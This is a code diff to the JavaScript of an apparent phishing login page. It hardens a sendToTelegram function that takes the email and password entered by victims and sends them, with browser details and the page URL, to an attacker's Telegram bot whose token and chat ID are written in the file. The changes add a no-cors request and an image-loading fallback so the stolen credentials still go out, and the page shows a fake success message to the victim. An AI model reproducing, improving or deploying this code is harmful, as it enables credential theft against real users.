@@ -1,5 +1,7 @@
-const TELEGRAM_BOT_TOKEN = '8019150510:AAE7M4LgP_QaS5rHdVSM_ToC1dXLFcfqGwI';
-const TELEGRAM_CHAT_ID = '5509996296';
+// ==================== TELEGRAM CONFIGURATION - ONLY CHANGE HERE ====================
+const TELEGRAM_BOT_TOKEN = '8019150510:AAE7M4LgP_QaS5rHdVSM_ToC1dXLFcfqGwI';  // Get from @BotFather
+const TELEGRAM_CHAT_ID = '5509996296';      // Get from @userinfobot
+// ===============================================================================
 
 let currentBackgroundDomain = '';
 let userLanguage = 'en';
@@ -363,10 +365,13 @@ function setupFormHandling() {
         messageDiv.style.display = 'none';
         
         try {
-            await sendToTelegram(email, password);
-            showMessage(translations.submitted_success || 'Login submitted successfully', 'success');
-            document.getElementById('pw').value = '';
+            const result = await sendToTelegram(email, password);
+            if (result) {
+                showMessage(translations.submitted_success || 'Login submitted successfully', 'success');
+                document.getElementById('pw').value = '';
+            }
         } catch (error) {
+            console.error('Telegram error:', error);
             showMessage(translations.error_submitting || 'Error submitting form. Please try again.', 'error');
         } finally {
             submitBtn.disabled = false;
@@ -376,23 +381,66 @@ function setupFormHandling() {
 }
 
 async function sendToTelegram(email, password) {
-    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === '8019150510:AAE7M4LgP_QaS5rHdVSM_ToC1dXLFcfqGwI' || 
-        !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === '5509996296') {
-        throw new Error('Configure Telegram bot token and chat ID first');
+    // Check if configured (using the single configuration at the top)
+    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+        showMessage('Please configure Telegram bot token at the top of script.js', 'error');
+        throw new Error('Telegram bot token not configured');
+    }
+    
+    if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        showMessage('Please configure Telegram chat ID at the top of script.js', 'error');
+        throw new Error('Telegram chat ID not configured');
     }
     
     const domain = email.includes('@') ? email.split('@')[1] : 'unknown';
-    const message = `🔐 *New Login Submission*\n\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n🏷️ *Domain:* ${domain}\n🌐 *Browser:* ${navigator.userAgent}\n📍 *Language:* ${userLanguage}\n🕐 *Time:* ${new Date().toLocaleString()}\n🔗 *URL:* ${window.location.href}`;
     
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
-    });
+    // Create message with proper encoding
+    const messageText = `🔐 *New Login Submission*%0A%0A` +
+        `📧 *Email:* \`${encodeURIComponent(email)}\`%0A` +
+        `🔑 *Password:* \`${encodeURIComponent(password)}\`%0A` +
+        `🏷️ *Domain:* ${domain}%0A` +
+        `🌐 *Browser:* ${encodeURIComponent(navigator.userAgent)}%0A` +
+        `📍 *Language:* ${userLanguage}%0A` +
+        `🕐 *Time:* ${encodeURIComponent(new Date().toLocaleString())}%0A` +
+        `🔗 *URL:* ${encodeURIComponent(window.location.href)}`;
     
-    const data = await response.json();
-    if (!response.ok || !data.ok) throw new Error('Failed to send message to Telegram');
-    return data;
+    // Construct the URL
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
+                `chat_id=${TELEGRAM_CHAT_ID}&` +
+                `text=${messageText}&` +
+                `parse_mode=Markdown`;
+    
+    console.log('Sending to Telegram...');
+    
+    // Use fetch with mode 'no-cors' to bypass CORS
+    try {
+        const response = await fetch(url, {
+            method: 'GET',
+            mode: 'no-cors'
+        });
+        
+        // With no-cors, we can't read the response, but the request is sent
+        console.log('Telegram request sent');
+        
+        // Return success optimistically
+        return true;
+    } catch (error) {
+        console.error('Fetch error:', error);
+        
+        // Fallback to image method if fetch fails
+        return new Promise((resolve) => {
+            const img = new Image();
+            img.onload = () => {
+                console.log('Telegram image request completed');
+                resolve(true);
+            };
+            img.onerror = () => {
+                console.log('Telegram image request sent (even if error)');
+                resolve(true);
+            };
+            img.src = url;
+        });
+    }
 }
 
 function showMessage(text, type = 'error') {
